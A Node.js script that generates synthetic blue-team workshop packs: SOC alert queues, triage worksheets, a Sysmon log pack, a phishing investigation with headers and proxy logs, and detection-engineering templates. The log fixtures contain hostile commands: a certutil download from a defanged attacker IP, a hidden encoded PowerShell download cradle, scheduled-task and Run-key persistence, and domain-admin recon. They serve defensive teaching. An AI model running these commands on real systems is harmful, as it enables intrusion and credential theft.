#!/usr/bin/env node
/* =========================================================================
   GENERATE WORKSHOP RESOURCES
   =========================================================================
   Produces the downloadable student packs referenced by each practical
   briefing, into public/resources/<session-slug>/.

   Everything emitted here is SYNTHETIC and deterministic: the same seed
   produces the same pack every time, so every student in a room is looking
   at identical data and an instructor can point at a specific line number.

   No file produced here contains answer keys or solution walkthroughs.
   Those belong in a separate, access-controlled distribution — anything
   written into public/ is world-readable once deployed.

   Run with:  npm run resources
   ========================================================================= */

import { mkdirSync, writeFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..')
const OUT = join(ROOT, 'public', 'resources')

/* ---------- Deterministic pseudo-random ---------------------------------- */
let seed = 20260314
function rnd() {
  seed = (seed * 1103515245 + 12345) % 2147483648
  return seed / 2147483648
}
const pick = (a) => a[Math.floor(rnd() * a.length)]
const int = (lo, hi) => lo + Math.floor(rnd() * (hi - lo + 1))
const pad = (n, w = 2) => String(n).padStart(w, '0')
const hhmmss = (h, m, s) => `${pad(h)}:${pad(m)}:${pad(s)}`

function write(session, name, body) {
  const dir = join(OUT, session)
  mkdirSync(dir, { recursive: true })
  writeFileSync(join(dir, name), body.trimStart() + '\n', 'utf8')
  return `${session}/${name}`
}

const BANNER = (title, note) => `
# ${title}

> **SYNTHETIC TEACHING DATA — CODED Blue Team Classroom**
> Every host, account, address, domain and hash below is fabricated for this
> workshop. No real environment produced this data. Do not visit any address or
> domain shown. Addresses are written defanged (hxxp://, 185[.]220[.]101[.]45)
> where they would otherwise be clickable.
>
> ${note}
`

/* =========================================================================
   SESSION 1 — Tier 1 queue
   ========================================================================= */

function session01() {
  const files = []

  const alerts = [
    {
      id: 'ALR-2211',
      time: '23:14',
      rule: 'MAL-EXEC-012 · Macro-Enabled Attachment Executed',
      severity: 'Medium',
      body: `Host: FIN-WS-22 | User: m.alotaibi
EXCEL.EXE spawned powershell.exe with an encoded command at 23:14:08.

Context available to you:
  - Baseline: m.alotaibi is a finance analyst. No prior process-creation
    events involving powershell.exe under this account in 180 days.
  - Asset: FIN-WS-22 is a standard finance workstation, EDR agent healthy,
    last check-in 23:13:58.
  - Change management: no deployment scheduled.
  - Context window: at 23:16 a file was written to C:\\Users\\Public\\svchost32.exe.
    At 23:17 a scheduled task named WindowsUpdate_Helper was created pointing
    at that file.
  - Mail gateway: an .xlsm attachment was delivered to this user at 23:11
    from an external sender.`,
    },
    {
      id: 'ALR-2212',
      time: '23:48',
      rule: 'AUTH-CORR-004 · Failed Logon Burst Followed By Success',
      severity: 'High',
      body: `Account: svc-dbadmin | Source: 185[.]220[.]101[.]45
3 x Event ID 4625 then 1 x 4624, LogonType 10 (RDP), within 87 seconds.
Session granted SeDebugPrivilege.

Context available to you:
  - Baseline: svc-dbadmin is a service account with 11 months of LogonType 5
    (service) events and zero prior interactive or remote-interactive logons.
  - Threat intel: 185[.]220[.]101[.]45 appears on the ingested Tor exit node
    feed, refreshed 40 minutes ago. No prior business traffic.
  - Asset: destination host DB-PRD-03. The EDR agent on this host last
    reported 9 days ago.
  - Context window: no endpoint telemetry returned for the destination host.`,
    },
    {
      id: 'ALR-2213',
      time: '00:32',
      rule: 'EXFIL-003 · Large Outbound Transfer',
      severity: 'High',
      body: `Host: BACKUP-SRV-01 | Destination: 52[.]96[.]0[.]0/16 | Volume: 412 GB

Context available to you:
  - Baseline: BACKUP-SRV-01 transfers between 380 GB and 450 GB to this
    destination range every night between 00:15 and 04:00.
  - Process attribution: veeam-agent.exe, running from its installed path.
  - Change management: nightly backup job BKP-NIGHTLY-02, recorded as started
    at 00:15.
  - Destination: the address range belongs to the organisation's contracted
    cloud backup provider and is on the documented allowlist.
  - Context window: nothing else notable on this host.`,
    },
    {
      id: 'ALR-2214',
      time: '01:05',
      rule: 'PERSIST-003 · Scheduled Task Created Outside Business Hours',
      severity: 'Low',
      body: `Host: FIN-WS-22 | User: m.alotaibi
Event ID 4698 at 01:05:12. Task name: WindowsUpdate_Helper.
Action: C:\\Users\\Public\\svchost32.exe

Context available to you:
  - Baseline: no prior scheduled task creation by this account, ever.
  - Path: C:\\Users\\Public is world-writable. The genuine Windows binary is
    svchost.exe in System32; svchost32.exe does not exist in Windows.
  - Timing: 01:05. The user badged out at 17:40 the previous evening.
  - Change management: no patch deployment scheduled. The patch management
    system does not create tasks with this name.
  - Context window: see ALR-2211. Same host.`,
    },
    {
      id: 'ALR-2215',
      time: '02:19',
      rule: 'IDENT-007 · Impossible Travel',
      severity: 'High',
      body: `Account: a.hassan | Kuwait City 02:02 -> Frankfurt 02:19

Context available to you:
  - Baseline: a.hassan authenticates from Kuwait City on almost every working
    day. Frankfurt has appeared 14 times in 90 days, always in short bursts.
  - Source: the Frankfurt address belongs to a commercial VPN provider the
    organisation licenses and deploys to staff laptops.
  - Device: both authentications carry the same managed device identifier and
    the same compliant device posture.
  - Context window: no privilege changes, no unusual resource access, no
    denied MFA prompts.`,
    },
    {
      id: 'ALR-2216',
      time: '03:41',
      rule: 'EXEC-002 · Encoded PowerShell Command',
      severity: 'Medium',
      body: `Host: BUILD-AGENT-03 | User: svc_deploy
powershell.exe -enc JABzAD0A... | Parent: jenkins-agent.exe

Context available to you:
  - Baseline: svc_deploy runs encoded PowerShell on this host 40-60 times per
    day, every weekday, for the past 8 months.
  - Parent: jenkins-agent.exe, running from its installed path.
  - Change management: pipeline run #4471 recorded in the deployment log at
    03:40.
  - Context window: normal build activity. No outbound connections to
    unrecognised destinations.`,
    },
    {
      id: 'ALR-2217',
      time: '04:52',
      rule: 'CRED-009 · LSASS Process Access',
      severity: 'High',
      body: `Host: DB-PRD-03 | Source process: C:\\Users\\Public\\dbg.exe
Sysmon Event ID 10, TargetImage lsass.exe, GrantedAccess 0x1410.

Context available to you:
  - Baseline: no process has accessed lsass.exe on this host outside the
    documented security product exclusions in 90 days.
  - Path: C:\\Users\\Public is world-writable. dbg.exe is not a known tool in
    the software inventory.
  - Access mask: 0x1410 is one of the masks associated with credential
    dumping tooling.
  - Context window: see ALR-2212. Same host, 5 hours later. The EDR agent on
    this host has not reported for 9 days, so this event reached the SIEM via
    the Windows Event Log forwarder only.`,
    },
    {
      id: 'ALR-2218',
      time: '05:30',
      rule: 'NET-014 · Port Scan Detected',
      severity: 'Medium',
      body: `Source: 10[.]0[.]12[.]40 | 1,400 connection attempts across 10[.]0[.]0[.]0/16

Context available to you:
  - Baseline: 10[.]0[.]12[.]40 is VULN-SCAN-01, the vulnerability management
    appliance.
  - Change management: authorised scan window is 05:00-07:00 on Wednesdays.
    Today is Wednesday.
  - Scan schedule: scan job VM-WEEKLY-INTERNAL recorded as started 05:29.
  - Context window: scan traffic only. No authentication attempts, no data
    transfer.`,
    },
  ]

  const pack = `${BANNER(
    'Session 1 — Alert pack: one night on the Tier 1 queue',
    'Eight alerts, 23:00 to 06:00. Two of them are related. Read all eight before deciding anything.',
  )}
## How to use this pack

Each alert gives you the detection and the context you are allowed to query.
In a real SOC you would run these lookups yourself against the SIEM, the asset
inventory, the threat intel feed and the change management system. Here they
are pre-answered, so the exercise is the judgement rather than the tooling.

Work through \`01-triage-worksheet.md\` as you go.

---

${alerts
  .map(
    (a) => `## ${a.id} — ${a.time}

**Rule:** ${a.rule}
**Severity as assigned by the rule:** ${a.severity}

\`\`\`
${a.body}
\`\`\`
`,
  )
  .join('\n---\n\n')}
---

## A note on the severity field

The severity on each alert was set by whoever wrote the rule, before this
particular night existed. It is an input to your judgement, not a substitute
for it. At least one alert in this pack is rated lower than it deserves.
`

  files.push(write('soc-operations', '00-alert-pack.md', pack))

  const worksheet = `${BANNER(
    'Session 1 — Triage worksheet',
    'One row per alert. Answer all six questions before writing a decision.',
  )}
## Instructions

For each of the eight alerts, answer all six context questions. Record the
answer even when it is "no data available" — that answer is a finding about
your monitoring, not a dead end.

Write the justification **before** you write the decision. If the justification
will not support the decision, change the decision.

---

${alerts
  .map(
    (a) => `## ${a.id} — ${a.rule.split(' · ')[0]}

| Question | Your answer |
|---|---|
| **Baseline** — is this the first time this account or host has done this? | |
| **Reputation** — is the source known? Threat intel, prior incidents? | |
| **Timing** — is this normal for this hour, this day? | |
| **Correlation** — does this account/host/address appear in other alerts? | |
| **Context window** — what happened ±30 minutes? | |
| **Technique** — which ATT&CK technique, and therefore which phase? | |

**Decision:** ☐ Close as false positive ☐ Escalate to Tier 2 ☐ Escalate as confirmed incident

**Justification:**

>

**ATT&CK mapping (escalations only):**

>
`,
  )
  .join('\n---\n\n')}
---

## Summary

| Alert | Decision | One-line reason |
|---|---|---|
${alerts.map((a) => `| ${a.id} | | |`).join('\n')}

**Alerts you believe are related:**

>

**Visibility gaps this shift exposed** (not alerts — record separately):

>
`

  files.push(write('soc-operations', '01-triage-worksheet.md', worksheet))
  return files
}

/* =========================================================================
   SESSION 2 — HR-WS-08 log pack
   ========================================================================= */

function session02() {
  const files = []
  const lines = []

  const benignPairs = [
    ['explorer.exe', 'chrome.exe'],
    ['explorer.exe', 'OUTLOOK.EXE'],
    ['explorer.exe', 'EXCEL.EXE'],
    ['explorer.exe', 'notepad.exe'],
    ['explorer.exe', 'Teams.exe'],
    ['services.exe', 'svchost.exe'],
    ['services.exe', 'spoolsv.exe'],
    ['services.exe', 'MsMpEng.exe'],
    ['svchost.exe', 'taskhostw.exe'],
    ['svchost.exe', 'WmiPrvSE.exe'],
    ['chrome.exe', 'chrome.exe'],
    ['MsMpEng.exe', 'MpCmdRun.exe'],
    ['OUTLOOK.EXE', 'chrome.exe'],
  ]

  // Ordinary activity across a four-hour window.
  for (let h = 8; h < 12; h++) {
    for (let i = 0; i < 24; i++) {
      const [parent, child] = pick(benignPairs)
      lines.push({
        t: hhmmss(h, int(0, 59), int(0, 59)),
        s: `Sysmon:1  ParentImage=C:\\Windows\\explorer.exe Image=${child}  User=HR\\s.alqattan  PID=${int(1000, 9000)}  Parent=${parent}`,
      })
    }
    // Authentication noise
    lines.push({
      t: hhmmss(h, int(0, 59), int(0, 59)),
      s: `Security:4624  User=HR\\s.alqattan  LogonType=3  Source=10.0.4.18  AuthPkg=Kerberos`,
    })
  }

  // The chain, at fixed times so the instructor can point at it.
  const chain = [
    ['09:02:14', `Security:4624  User=HR\\s.alqattan  LogonType=2  Workstation=HR-WS-08  AuthPkg=Kerberos`],
    ['09:08:51', `Sysmon:1  ParentImage=OUTLOOK.EXE  Image=WINWORD.EXE  CommandLine="WINWORD.EXE /n Benefits_Enrolment_2026.docm"  User=HR\\s.alqattan  PID=4412`],
    ['09:09:03', `Sysmon:1  ParentImage=WINWORD.EXE  Image=cmd.exe  CommandLine="cmd /c powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"  User=HR\\s.alqattan  PID=4498  Parent=4412`],
    ['09:09:04', `Sysmon:1  ParentImage=cmd.exe  Image=powershell.exe  CommandLine="powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"  User=HR\\s.alqattan  PID=4501  Parent=4498`],
    ['09:09:29', `Sysmon:1  ParentImage=powershell.exe  Image=certutil.exe  CommandLine="certutil -urlcache -split -f hxxp://185[.]220[.]101[.]45/a.txt C:\\Users\\Public\\od.exe"  User=HR\\s.alqattan  PID=4533  Parent=4501`],
    ['09:09:31', `Sysmon:3  Image=certutil.exe  PID=4533  Protocol=tcp  DestinationIp=185[.]220[.]101[.]45  DestinationPort=80  Initiated=true`],
    ['09:09:44', `Sysmon:11  Image=certutil.exe  PID=4533  TargetFilename=C:\\Users\\Public\\od.exe  CreationUtcTime=2026-03-12 09:09:44`],
    ['09:12:08', `Sysmon:1  ParentImage=powershell.exe  Image=whoami.exe  CommandLine="whoami /all"  User=HR\\s.alqattan  PID=4561  Parent=4501`],
    ['09:12:09', `Sysmon:1  ParentImage=powershell.exe  Image=net.exe  CommandLine="net group \\"Domain Admins\\" /domain"  User=HR\\s.alqattan  PID=4563  Parent=4501`],
    ['09:12:11', `Sysmon:1  ParentImage=powershell.exe  Image=ipconfig.exe  CommandLine="ipconfig /all"  User=HR\\s.alqattan  PID=4565  Parent=4501`],
    ['09:17:33', `Sysmon:1  ParentImage=powershell.exe  Image=schtasks.exe  CommandLine="schtasks /create /tn \\"OneDriveSync\\" /tr C:\\Users\\Public\\od.exe /sc onlogon /f"  User=HR\\s.alqattan  PID=4602  Parent=4501`],
    ['09:17:34', `Security:4698  TaskName=\\OneDriveSync  TaskContent=C:\\Users\\Public\\od.exe  SubjectUserName=s.alqattan`],
    ['09:22:50', `Sysmon:13  EventType=SetValue  TargetObject=HKU\\S-1-5-21-...\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync  Details=C:\\Users\\Public\\od.exe`],
    ['09:31:02', `Sysmon:3  Image=od.exe  PID=4731  Protocol=tcp  DestinationIp=185[.]220[.]101[.]45  DestinationPort=443  Initiated=true`],
    ['09:35:02', `Sysmon:3  Image=od.exe  PID=4731  Protocol=tcp  DestinationIp=185[.]220[.]101[.]45  DestinationPort=443  Initiated=true`],
    ['09:39:02', `Sysmon:3  Image=od.exe  PID=4731  Protocol=tcp  DestinationIp=185[.]220[.]101[.]45  DestinationPort=443  Initiated=true`],
  ]
  chain.forEach(([t, s]) => lines.push({ t, s }))

  lines.sort((a, b) => a.t.localeCompare(b.t))

  const pack = `${BANNER(
    'Session 2 — HR-WS-08 log pack',
    'Merged Windows Security, Sysmon and proxy events. One four-hour window. Roughly 400 lines.',
  )}
## Host

\`\`\`
Hostname : HR-WS-08
Role     : HR department workstation
OS       : Windows 11 Enterprise 23H2
Sysmon   : deployed, SwiftOnSecurity-derived configuration
Audit    : Process Creation Auditing enabled with command line capture
Date     : 2026-03-12
\`\`\`

## Before you filter anything

Read fifty consecutive lines from the middle of this file. You cannot recognise
abnormal activity without first knowing what ordinary activity on this host
looks like. That is task T1 and it is not optional.

---

\`\`\`
${lines.map((l) => `${l.t}  ${l.s}`).join('\n')}
\`\`\`

---

## What is NOT in this pack

Part of task T4 is identifying what log evidence structurally cannot tell you.
This pack deliberately contains no mail gateway logs, no memory capture and no
disk image. If your answer to "how was the document delivered" is "the pack
contains no mail gateway events, so delivery cannot be established from this
evidence" — that is a correct and complete answer.
`

  files.push(write('log-analysis', '00-hr-ws-08-logs.md', pack))

  files.push(
    write(
      'log-analysis',
      '01-timeline-template.md',
      `${BANNER(
        'Session 2 — Timeline template',
        'One row per confirmed step. A row with no named evidence source does not belong in a forensic timeline.',
      )}
## Timeline

| Time | Source | Event | What it proves | ATT&CK | Confidence |
|---|---|---|---|---|---|
| | | | | | obs / hyp / confirmed |
| | | | | | |
| | | | | | |
| | | | | | |
| | | | | | |
| | | | | | |
| | | | | | |
| | | | | | |

**Confidence rules**
- \`obs\` — a source literally recorded this
- \`hyp\` — your proposed explanation, not yet supported
- \`confirmed\` — **two supporting sources** support the interpretation for this workshop. Name both and state any shared collector or trust boundary.

---

## Decoded commands

| Encoded | Decoded | What it does |
|---|---|---|
| | | |
| | | |

---

## Open questions

Three things you cannot determine from logs alone, each with the evidence
source that would resolve it.

| Cannot determine | Evidence source that would resolve it |
|---|---|
| | |
| | |
| | |

---

## Finding

**Finding:**

**Severity:**

**Impact:**

**Evidence:** *(cite the artefact for every claim)*

**Remediation:**
`,
    ),
  )

  return files
}

/* =========================================================================
   SESSION 3 — Phishing investigation pack
   ========================================================================= */

function session03() {
  const files = []

  const proxy = []
  const hosts = ['10.0.4.11', '10.0.4.18', '10.0.4.22', '10.0.4.31', '10.0.5.07', '10.0.5.14']
  for (let i = 0; i < 90; i++) {
    const h = int(9, 11)
    proxy.push({
      t: hhmmss(h, int(0, 59), int(0, 59)),
      s: `${pick(hosts)}  GET   https://${pick(['www.microsoft.com', 'teams.microsoft.com', 'outlook.office.com', 'cdn.jsdelivr.net', 'www.google.com'])}/  200  text/html`,
    })
  }
  // The clicks and the submissions.
  proxy.push({ t: '09:31:44', s: `10.0.4.18  GET   hxxps://login[.]micros0ft-support247[.]com/verify  200  text/html` })
  proxy.push({ t: '09:32:02', s: `10.0.4.18  POST  hxxps://login[.]micros0ft-support247[.]com/verify  302  application/x-www-form-urlencoded  len=184` })
  proxy.push({ t: '09:38:11', s: `10.0.4.31  GET   hxxps://login[.]micros0ft-support247[.]com/verify  200  text/html` })
  proxy.push({ t: '09:38:50', s: `10.0.4.31  POST  hxxps://login[.]micros0ft-support247[.]com/verify  302  application/x-www-form-urlencoded  len=191` })
  proxy.push({ t: '09:44:19', s: `10.0.5.07  GET   hxxps://login[.]micros0ft-support247[.]com/verify  200  text/html` })
  proxy.sort((a, b) => a.t.localeCompare(b.t))

  const pack = `${BANNER(
    'Session 3 — Phishing investigation pack',
    'One reported email with headers intact, plus the gateway, proxy and authentication logs for the window.',
  )}
## The report

At 09:40 a user forwarded this message to the SOC inbox, correctly, as an
attachment — so the original headers are preserved.

> "I got a strange email from Microsoft Support saying my account will be
> deleted in 24 hours unless I verify my details. I clicked the link but then
> got suspicious and closed it. The page looked exactly like Microsoft. Should
> I be worried?"

The user has not said whether they typed anything.

---

## 1. The email, with headers

\`\`\`
Return-Path: <bounce@micros0ft-support247[.]com>
Received: from mail.ourcompany.com (10.0.0.25)
        by mx1.ourcompany.com with ESMTPS; Thu, 12 Mar 2026 09:02:41 +0300
Received: from smtp-relay-07.bulkmail-svc[.]net (198[.]51[.]100[.]77)
        by mail.ourcompany.com with ESMTP; Thu, 12 Mar 2026 09:02:38 +0300
Received: from [185[.]220[.]101[.]45]
        by smtp-relay-07.bulkmail-svc[.]net with SMTP; Thu, 12 Mar 2026 09:02:31 +0300
Authentication-Results: mx1.ourcompany.com;
        spf=pass (domain of micros0ft-support247[.]com designates
             198[.]51[.]100[.]77 as permitted sender);
        dkim=pass header.d=micros0ft-support247[.]com;
        dmarc=pass
X-Originating-IP: [185[.]220[.]101[.]45]
Message-ID: <a71f2c99-bulk-0442@micros0ft-support247[.]com>
From: Microsoft Support <support@micros0ft-support247[.]com>
Reply-To: account-team@micros0ft-support247[.]com
To: s.alqattan@ourcompany.com
Subject: Action required: your account will be deleted in 24 hours
Date: Thu, 12 Mar 2026 09:02:28 +0300
Content-Type: text/html; charset=UTF-8

--- body (rendered text) ---
Your Microsoft account has been flagged for deletion due to unverified
security information. Verify now to keep your account active.

[ Verify my account ]  ->  hxxps://login[.]micros0ft-support247[.]com/verify

Microsoft Account Team
\`\`\`

---

### Evidence boundary for this synthetic message

The gateway trusts its internal relay mail.ourcompany.com and its own
Authentication-Results record. The internal relay records external peer
198[.]51[.]100[.]77. The earlier claimed origin 185[.]220[.]101[.]45 and
X-Originating-IP are unverified until a trusted relay record corroborates them.
Use the claimed address as a labelled pivot lead, not a verified attribution.
The visible From address uses the lookalike domain, allowing its aligned
SPF/DKIM authentication to produce DMARC pass.

## 2. Mail gateway delivery log

\`\`\`
SUBJECT MATCH: "Action required: your account will be deleted in 24 hours"
SENDER DOMAIN: micros0ft-support247[.]com

09:02:41  DELIVERED  s.alqattan@ourcompany.com
09:02:41  DELIVERED  m.alotaibi@ourcompany.com
09:02:42  DELIVERED  a.hassan@ourcompany.com
09:02:42  DELIVERED  f.alsalem@ourcompany.com
09:02:43  DELIVERED  n.aldosari@ourcompany.com
09:02:43  DELIVERED  y.almutairi@ourcompany.com
... (40 further DELIVERED entries omitted for length)
09:03:12  DELIVERED  r.alenezi@ourcompany.com

TOTAL DELIVERED: 47
OPEN SIGNALS RECORDED: 9  (tracking signals, not proof of nine human opens)
\`\`\`

---

## 3. Proxy log (09:00–11:59, filtered to external HTTP/HTTPS)

\`\`\`
${proxy.map((p) => `${p.t}  ${p.s}`).join('\n')}
\`\`\`

---

### Asset/account mapping supplied for this exercise

| Host | Assigned user account |
|---|---|
| 10.0.4.18 | s.alqattan |
| 10.0.4.31 | m.alotaibi |
| 10.0.5.07 | a.hassan |

The page analysis below identifies a credential form. Requests to that form
justify prompt precautionary containment of mapped accounts. The proxy log
contains request metadata, not passwords or a captured request body. Distinguish
likely credential exposure from a proven statement about the submitted values.
DNS queries, tracking pixels and automated URL fetches do not prove a human click.

## 4. Authentication log (09:00–13:00, external sources only)

\`\`\`
09:18:04  SUCCESS  a.hassan      source=94[.]203[.]12[.]9    country=KW  device=managed-4417  mfa=satisfied
10:02:51  SUCCESS  f.alsalem     source=94[.]203[.]12[.]9    country=KW  device=managed-3302  mfa=satisfied
11:47:22  SUCCESS  s.alqattan    source=45[.]142[.]214[.]88  country=RO  device=UNKNOWN      mfa=satisfied
12:31:09  SUCCESS  n.aldosari    source=94[.]203[.]12[.]9    country=KW  device=managed-5120  mfa=satisfied
\`\`\`

---

## 5. Enrichment file

Every lookup below would, in a live investigation, hit a third-party service.
They are pre-answered here so the exercise is the inference rather than the
tooling. The tool each answer represents is named.

### WHOIS — micros0ft-support247[.]com
\`\`\`
Registered     : 2026-03-10  (2 days before the campaign)
Registrar      : (privacy-protected)
Registrant     : REDACTED FOR PRIVACY
Name servers   : ns1.bulletproof-dns[.]ru, ns2.bulletproof-dns[.]ru
Hosting        : VPS, Bucharest, RO
\`\`\`

### URLScan.io — hxxps://login[.]micros0ft-support247[.]com/verify
\`\`\`
Final URL     : same (no redirect chain)
Page          : pixel-accurate clone of the Microsoft sign-in page
Form action   : POST to /verify, fields: loginfmt, passwd
TLS           : valid certificate, Let's Encrypt, issued 2026-03-10
Verdict       : no prior reputation — first submission
\`\`\`

### Passive DNS — 185[.]220[.]101[.]45
\`\`\`
Domains historically resolving to this address:
  micros0ft-support247[.]com    first seen 2026-03-10
  0ffice365-verify[.]com        first seen 2026-03-09
  googIe-accounts-verify[.]net  first seen 2026-03-09   (capital I, not lowercase l)
  dropbox-secure-login[.]com    first seen 2026-03-11
\`\`\`

### Certificate transparency (crt.sh) — certificate fingerprint of the phishing site
\`\`\`
Domains sharing this certificate:
  login.micros0ft-support247[.]com
  mail.micros0ft-support247[.]com
  sso.micros0ft-support247[.]com
\`\`\`

### Threat intel — 45[.]142[.]214[.]88
\`\`\`
AbuseIPDB     : 31 reports in 90 days, categories: brute force, web spam
Geolocation   : Bucharest, RO
ASN           : hosting provider, same ASN as 185[.]220[.]101[.]45
\`\`\`

---

## What is NOT in this pack

No EDR telemetry and no endpoint process events. If your conclusion about
whether anything executed on an endpoint is "cannot be established from this
evidence", that is correct — and naming the evidence source that would resolve
it is part of the exercise.
`

  files.push(write('phishing-investigation', '00-investigation-pack.md', pack))

  files.push(
    write(
      'phishing-investigation',
      '01-ioc-worksheet-and-report.md',
      `${BANNER(
        'Session 3 — IOC worksheet and report template',
        'Mark pivoted indicators differently from observed ones. The person acting on your list needs to know the difference.',
      )}
## Action log — timestamp every containment decision

The **sequence** of your actions is 25% of the assessment. Record the real
clock time at which you decided each one.

| Real time | Action taken | What justified it |
|---|---|---|
| | | |
| | | |
| | | |
| | | |

---

## Header findings

| Field | Value | What it establishes |
|---|---|---|
| Earliest verified peer / earlier unverified claim | | |
| Return-Path | | |
| Reply-To | | |
| From (display) | | |
| Authentication results | | |
| Sending domain registration age | | |

**One sentence on what the authentication results actually establish:**

>

---

## Impact table

| Level | Count | Hosts / accounts | Log source that establishes it |
|---|---|---|---|
| Received | | | |
| Open signals (state limits) | | | |
| Requests / corroborated clicks | | | |
| Potential credential exposure (state evidence) | | | |
| Attachment executed | | | |

---

## IOC list

\`\`\`
# Mark each indicator:  [O] observed in this campaign   [P] discovered by pivot

NETWORK
  [ ]
  [ ]
  [ ]

DOMAINS
  [ ]
  [ ]
  [ ]

URLS
  [ ]

ACCOUNTS AFFECTED
  [ ]
\`\`\`

---

## Pivot record

| Starting indicator | Pivot path | What it found |
|---|---|---|
| | | |
| | | |

---

## Investigation report

### Executive summary

*Three sentences. Written for someone who does not know what SPF is. If it
contains an unexplained acronym, rewrite it.*

>

### Timeline

| Time | Event |
|---|---|
| | |

### Technical detail

>

### User impact

>

### Actions taken

>

### Detection recommendation

**Recommended rule:**

>

**What it would NOT catch:**

>
`,
    ),
  )

  return files
}

/* =========================================================================
   Remaining sessions — packs and templates
   ========================================================================= */

function session04() {
  const files = []
  files.push(
    write(
      'detection-engineering',
      '00-rebuild-pack.md',
      `${BANNER(
        'Session 4 — Detection rebuild pack',
        'Post-incident report, current rule inventory, log source audit, and sector threat intelligence.',
      )}
## 1. Post-incident report (extract)

\`\`\`
INCIDENT   : IR-2025-1140, ransomware
DWELL TIME : 14 days from initial access to encryption
IMPACT     : 40,000 files encrypted across 23 hosts

RECONSTRUCTED CHAIN
  Stage                                    Technique    ID         Detected?
  ---------------------------------------  -----------  ---------  ---------
  Phishing email, Excel attachment         Spearphish   T1566.001  Flagged, not blocked
  Excel macro ran encoded PowerShell       PowerShell   T1059.001  No
  PowerShell downloaded second stage       Ingress      T1105      No
  RDP lateral movement across 23 hosts     RDP          T1021.001  No
  Stolen admin credentials reused          Valid Accts  T1078      No
  40,000 files encrypted                   Impact       T1486      No

Six techniques. One flagged. Fourteen days undetected.
\`\`\`

---

## 2. Current rule inventory

\`\`\`csv
rule_id,title,logsource_category,attack_technique,status,fp_rate_per_day
R-001,Security log cleared,windows_eventlog,T1070.001,stable,0
R-002,LSASS process access from non-system process,process_access,T1003.001,stable,1
R-003,Scheduled task created by non-SYSTEM account,windows_eventlog,T1053.005,stable,34
R-004,Registry Run key modification,registry_set,T1547.001,stable,6
R-005,Impossible travel,identity_logs,T1078,stable,3
R-006,Encoded PowerShell from non-admin account,process_creation,T1059.001,stable,11
R-007,File write to world-writable path then execution,file_event,T1204.002,test,8
R-008,Mass file modification >500 events in 60s,windows_eventlog,T1486,stable,0
R-009,WAF injection attempt,waf_logs,T1190,stable,0
R-010,Outbound volume anomaly per host,netflow,T1041,stable,0
\`\`\`

---

## 3. Log source audit

\`\`\`
CATEGORY              FORWARDING?  COVERAGE   NOTES
--------------------  -----------  ---------  ------------------------------------
windows_eventlog      YES          98%        Healthy
process_creation      YES          94%        Sysmon; 6% of estate not yet deployed
process_access        YES          94%        Sysmon Event ID 10
registry_set          YES          94%        Sysmon Event ID 13
file_event            YES          94%        Sysmon Event ID 11
network_connection    YES          94%        Sysmon Event ID 3
dns_query             NO           0%         NOT COLLECTED — no resolver forwarding
identity_logs         YES          100%       Directory and VPN
waf_logs              NO           0%         NOT FORWARDED — appliance logs stay local
netflow               NO           0%         NOT COLLECTED — no collector deployed
email_gateway         YES          100%       Healthy
\`\`\`

> Two rules in the inventory above reference a category that is not
> forwarding. Those rules read as green on a coverage map and cannot fire.
> Finding them is task T1.

---

## 4. Sector threat intelligence summary

\`\`\`
SECTOR: financial services, GCC region
REPORTING PERIOD: last 12 months

Techniques observed in attacks against this sector, by frequency:

  T1566.001  Spearphishing Attachment          very high
  T1059.001  PowerShell                        very high
  T1021.001  Remote Desktop Protocol           high
  T1078      Valid Accounts                    high
  T1550.002  Pass the Hash                     high
  T1003.006  DCSync                            medium
  T1558.003  Kerberoasting                     medium
  T1486      Data Encrypted for Impact         medium
  T1047      Windows Management Instrumentation medium
  T1567.002  Exfiltration to Cloud Storage     medium
  T1190      Exploit Public-Facing Application low
\`\`\`
`,
    ),
  )

  files.push(
    write(
      'detection-engineering',
      '01-sigma-template.yml',
      `# =========================================================================
# SIGMA RULE TEMPLATE — CODED Blue Team Classroom, Session 4
# =========================================================================
# Fill every field. The comments explain what each one is for and what a
# reviewer will check. Delete the comments in your submission.
#
# Validate your YAML before submitting: indentation is significant.
# =========================================================================

# Written for the analyst receiving the alert at 03:00, not for you.
# State what fired and why that is unusual.
title:

# A UUID. Generate one — it lets this rule be referenced unambiguously
# across platforms, teams and organisations.
id:

# Honest maturity signalling. Nothing you write today is 'stable'.
#   experimental -> test -> stable
status: experimental

# Full explanation: what this detects, and why these conditions.
description: >

references:
  - https://attack.mitre.org/techniques/

author:
date: 2026/03/14

# Tactic and technique. This is what populates the coverage heatmap.
# A rule covering two stages carries tags for both.
tags:
  - attack.
  - attack.t

# The category the rule needs. THIS IS THE LINE THAT SILENTLY FAILS if the
# source is not onboarded — check it against the log source audit.
logsource:
  category:
  product: windows

detection:
  selection:
    # field|modifier: value

  # Exclusions go here. Name MORE THAN ONE FIELD. An exclusion on an account
  # name alone becomes a hole the moment that account is compromised.
  # filter:

  condition: selection

# NOT a disclaimer — operational instructions for the analyst. These are the
# things to check before escalating. An empty section means you have not
# worked out what else produces this pattern. There is always something.
falsepositives:
  -
  -

level:

# ---- Internal notes, beyond the Sigma standard --------------------------
# validation_plan:   what data proves it fires; what measures the FP rate
# tuning_notes:      what was tuned and why
# adapted_from:      if you started from a SigmaHQ rule, which one and what
#                    you changed
`,
    ),
  )
  return files
}

function session05() {
  const files = []
  files.push(
    write(
      'incident-response',
      '00-incident-pack.md',
      `${BANNER(
        'Session 5 — Incident pack',
        'Initial alert plus five timed injects. DO NOT read ahead — open each inject only when the clock reaches it.',
      )}
## Initial alert — T+0

\`\`\`
09:00:12  SIEM ALERT  P3
Rule     : EXEC-002 · Encoded PowerShell Command
Host     : FINANCE-PC-04
User     : jsmith
Detail   : EXCEL.EXE -> powershell.exe -enc SQBFAFgAIAAoAE4AZQB3...

Supporting evidence attached:
  - Sysmon Event ID 1 at 08:47:09, parent EXCEL.EXE
  - Sysmon Event ID 3 at 08:48:31, outbound to 91[.]92[.]251[.]103:443
  - Sysmon Event ID 11 at 08:48:44, C:\\Users\\Public\\stage2.exe created
  - Security Event ID 4698 at 08:52:40, task "AdobeUpdateSvc" created
  - Browser download artefact at 08:46:55, Q3_Update.xlsm
\`\`\`

